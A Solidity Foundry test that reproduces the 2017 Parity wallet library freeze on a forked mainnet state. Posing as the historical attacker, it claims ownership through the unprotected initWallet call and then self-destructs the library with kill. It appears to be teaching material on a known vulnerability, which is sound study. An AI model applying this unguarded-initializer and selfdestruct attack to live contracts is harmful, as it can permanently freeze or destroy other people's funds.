// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import {IHistoricalParityLibrary} from "../../src/03-parity-library-freeze/VulnerableProtocol.sol";

interface VmParityFork {
    function envString(string calldata name) external returns (string memory value);
    function createSelectFork(string calldata rpcUrl, uint256 blockNumber) external returns (uint256 forkId);
    function prank(address sender) external;
}

contract ParityHistoricalForkTest {
    VmParityFork private constant vm = VmParityFork(address(uint160(uint256(keccak256("hevm cheat code")))));
    address private constant HISTORICAL_LIBRARY = 0x863DF6BFa4469f3ead0bE8f9F2AAE51c91A907b4;
    address private constant HISTORICAL_ATTACKER = 0xae7168Deb525862f4FEe37d987A971b385b96952;
    uint256 private constant PRE_INCIDENT_BLOCK = 4_501_735;

    function testExploit_ReproduceParityLibraryFreezeOnHistoricalFork() external {
        string memory rpcUrl = vm.envString("MAINNET_RPC_URL");
        vm.createSelectFork(rpcUrl, PRE_INCIDENT_BLOCK);
        require(block.number == PRE_INCIDENT_BLOCK, "fork is at the wrong block");
        require(block.chainid == 1, "fork is not Ethereum mainnet");

        IHistoricalParityLibrary libraryContract = IHistoricalParityLibrary(HISTORICAL_LIBRARY);
        require(HISTORICAL_LIBRARY.code.length != 0, "historical library code unavailable at fork block");
        require(!libraryContract.isOwner(HISTORICAL_ATTACKER), "attacker unexpectedly owns library before call");

        address[] memory owners = new address[](1);
        owners[0] = HISTORICAL_ATTACKER;
        vm.prank(HISTORICAL_ATTACKER);
        libraryContract.initWallet(owners, 0, 0);
        require(libraryContract.isOwner(HISTORICAL_ATTACKER), "initializer did not grant ownership");

        vm.prank(HISTORICAL_ATTACKER);
        libraryContract.kill(payable(HISTORICAL_ATTACKER));
    }
}
